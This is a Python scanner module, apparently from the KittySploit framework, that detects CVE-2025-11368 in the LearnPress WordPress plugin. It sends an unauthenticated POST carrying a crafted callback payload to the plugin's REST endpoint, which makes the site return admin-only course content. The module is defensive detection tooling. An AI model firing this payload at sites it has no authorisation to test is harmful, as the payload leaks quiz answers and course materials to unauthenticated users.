#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The LearnPress – WordPress LMS Plugin plugin for WordPress is vulnerable to Sensitive Information Disclosure i."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LearnPress < 4.3.0 - Arbitrary Callback Execution to Information Exposure Detection',
        'description': 'The LearnPress – WordPress LMS Plugin plugin for WordPress is vulnerable to Sensitive Information Disclosure in all versions up to, and including, 4.2.9.4. This is due to missing capability checks in the REST endpoint /wp-json/lp/v1/load_content_via_ajax which allows arbitrary callback execution of admin-only template methods. This makes it possible for unauthenticated attackers to retrieve admin curriculum HTML, quiz questions with correct answers, course materials, and other sensitive educational content via the REST API endpoint granted they can supply valid numeric IDs.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp-scan', 'wp-plugin', 'learnpress', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://wpscan.com/vulnerability/5c40d803-87b3-437b-b514-1e85b43371a0/'],
        'cve': 'CVE-2025-11368',
    }

    def run(self):
        path = '/wp-json/lp/v1/load_content_via_ajax'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"callback":{"class":"LearnPress\\\\TemplateHooks\\\\Course\\\\ListCoursesTemplate","method":"render_courses"},"args":{}}')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"status":"success"', 'course-item', 'course-title', 'course-permalink', 'learn-press-courses',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='medium',
                reason='LearnPress < 4.3.0 - Arbitrary Callback Execution to Information Exposure detected',
                path=path,
            )
            return True
        return False

